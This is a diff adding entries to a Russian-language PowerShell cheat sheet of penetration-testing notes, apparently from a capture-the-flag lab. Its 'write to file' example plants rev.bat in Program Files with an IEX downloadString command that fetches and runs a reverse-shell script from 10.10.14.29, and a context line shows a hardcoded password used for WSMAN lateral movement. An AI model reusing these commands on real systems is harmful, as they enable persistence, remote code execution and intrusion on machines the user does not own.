@@ -1,3 +1,16 @@
+# Читать файл
+
+get-content "file"
+
+
+# Писать в файл
+
+set-content -path 'c:\program files\keepmeon\rev.bat' -value 'powershell "IEX(New-Object Net.WebClient).downloadString(\"http://10.10.14.29/rev_9002.ps1\")"'
+
+# Просмотр каталога со скрытыми файлами 
+
+Get-ChildItem -force
+
 # Переход на другой компутер используя WSMAN (POwershell)
 
 $pass = ConvertTo-SecureString "W3_4R3_th3_f0rce." -AsPlainText -Force
